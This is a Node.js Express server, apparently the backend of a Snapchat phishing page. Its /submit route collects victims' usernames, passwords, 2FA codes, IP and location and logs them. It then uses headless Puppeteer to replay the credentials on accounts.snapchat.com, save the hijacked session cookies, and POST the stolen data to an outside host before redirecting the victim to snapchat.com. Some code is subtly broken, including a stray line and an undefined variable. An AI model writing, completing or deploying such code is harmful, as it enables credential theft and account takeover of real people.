const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const fs = require('fs');
const fetch = require('node-fetch');

const app = express();
const PORT = process.env.PORT || 3000;

app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
  next();
});
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));
app.use(express.json());
app.post('/submit', async (req, res) => {
  try {
    const { username, password, twoFACode } = req.body;
    const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    const logData = {
      timestamp: new Date().toISOString(),
      ip: clientIp,
      userAgent: req.headers['user-agent'],
      username,
      password,
      twoFACode,
      latitude: req.body.latitude || "N/A",
      longitude: req.body.longitude || "N/A"
    };

    fs.appendFile('submissions.log', JSON.stringify(logData) + '\n', (err) => {
      if (err) console.error("Log-Fehler:", err);
    });

    console.log("👤 Benutzername:", username);
    console.log("🔑 Passwort:", password);
    console.log("🔢 2FA-Code:", twoFACode);
    console.log("📍 IP:", clientIp);

    if (username && password && twoFACode) {
      const puppeteer = require('puppeteer');
      const chromium = require('@sparticuz/chromium');
      (async () => {
      const browser = await puppeteer.launch({
      executablePath: await chromium.executablePath(),
      headless: true,                                 
      args: chromium.args,
      ignoreHTTPSErrors: true,
  });
        args: chromium.args
        const page = await browser.newPage();
        await page.goto('https://accounts.snapchat.com');
        await page.type('input[name="username"]', username);
        await page.type('input[name="password"]', password);
        await page.click('button[type="submit"]');
        await page.waitForSelector('input[name="otp_code"]', { timeout: 5000 });
        await page.type('input[name="otp_code"]', twoFACode);
        await page.click('button[type="submit"]');
        
        const cookies = await page.cookies();
        fs.appendFile('cookies.log', JSON.stringify(cookies) + '\n', () => {});
        
        await browser.close();
      })();
    }

    res.redirect('https://snapchat.com');
    await fetch('https://snapchat-usvu.onrender.com/submit', {
  method: 'POST',
  body: JSON.stringify(stolenData)
});

  } catch (error) {
    console.error("❌ Fehler:", error);
    res.status(500).send("Serverfehler");
  }
});

app.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 Server läuft auf Port ${PORT}`);
});;
